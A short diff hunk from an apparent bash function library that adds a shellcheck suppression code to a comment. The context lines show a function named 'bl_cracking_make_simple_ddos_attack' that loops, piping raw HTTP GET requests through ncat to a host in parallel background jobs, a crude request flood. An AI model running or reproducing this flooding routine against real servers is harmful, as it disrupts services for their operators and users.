@@ -116,7 +116,7 @@ bl_cracking_make_simple_ddos_attack() {
     '
     local index
     for (( index=0; index<"$1"; index++ )); do
-        # shellcheck disable=SC1117
+        # shellcheck disable=SC1117,SC2028
         echo "GET /$index\r\n\r\n" | ncat lilu "$2" &
     done
     return $?
